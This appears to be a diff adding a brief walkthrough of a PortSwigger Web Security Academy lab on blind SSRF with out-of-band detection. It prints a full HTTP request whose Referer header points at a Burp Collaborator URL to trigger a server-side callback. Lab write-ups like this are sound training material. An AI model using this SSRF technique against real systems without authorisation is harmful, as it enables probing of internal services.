@@ -1,0 +1,19 @@
+Blind SSRF with out-of-band detection
+
+Fairly simple once you figure out the trick. The out of band attack occurs in the Referer header.
+In order to test for it, fire up Burp Collaborator, and click on a random product. Send the request to repeater.
+Now replace the Referer header content with your collaborator URL.
+
+My request:
+
+GET /product?productId=1 HTTP/1.1
+Host: ac9a1f771e97a77c807f407f002d00f7.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://a9kxz7oje4b3dmqejm1r8v0qdhj77w.burpcollaborator.net
+Cookie: session=Si5MSAtLY8YbYElVTi7gZtphGQpwFsRq
+Upgrade-Insecure-Requests: 1
+
